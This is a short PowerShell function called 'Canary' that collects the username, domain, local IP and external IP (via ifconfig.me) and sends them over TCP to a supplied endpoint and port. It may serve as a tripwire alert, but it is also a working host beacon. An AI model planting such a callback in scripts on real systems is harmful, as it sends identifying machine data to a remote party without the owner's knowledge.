Function Canary {

    [CmdletBinding()]

    Param (
        [string] $EndPoint,
        [int] $Port
    )

    Process {

        $userDomain = $env:username + "\" + $env:userdomain
        $localIp = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.Ipaddress.length -gt 1}
        $externalIp = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content

        $Message = '[{0}] {1} Connected. Local IP: {2}' -f $externalIp, $userDomain, $localIp.ipaddress[0]

        $IP = [System.Net.Dns]::GetHostAddresses($EndPoint) 
        $Address = [System.Net.IPAddress]::Parse($IP) 
        $Socket = New-Object System.Net.Sockets.TCPClient($Address,$Port) 

        # Setup stream wrtier 
        $Stream = $Socket.GetStream() 
        $Writer = New-Object System.IO.StreamWriter($Stream)

        # Write message to stream
        $Message | % {
            $Writer.WriteLine($_)
            $Writer.Flush()
        }

        # Close connection and stream
        $Stream.Close()
        $Socket.Close()

    }
}
